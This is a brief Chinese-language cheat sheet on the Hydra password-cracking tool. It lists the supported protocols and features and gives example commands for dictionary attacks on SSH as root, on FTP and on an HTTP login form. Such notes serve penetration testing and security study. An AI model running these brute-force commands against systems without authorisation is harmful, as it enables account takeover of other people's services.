### 📌 工具簡介

- **用途**：線上破解工具，針對**網路服務的登入介面**
    
- 支援大量協定：FTP、SSH、Telnet、HTTP、HTTPS、RDP、VNC、POP3、IMAP、MySQL、MSSQL 等等
    
- 適合用來測試**服務登入介面的安全性**
    

### 🧠 功能特色

- 支援 **多執行緒**，大幅提升破解速度
    
- 可設定字典檔（帳號與密碼）
    
- 可進行 **暴力或字典攻擊**
    
- 支援 HTTP POST/GET 表單（Web login 攻擊）
    

### 🛠 常見用法

```
# SSH 字典攻擊
hydra -l root -P rockyou.txt ssh://192.168.1.100  

# FTP 登入測試 
hydra -L users.txt -P passwords.txt ftp://target_ip  

# HTTP 表單攻擊範例 
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"
```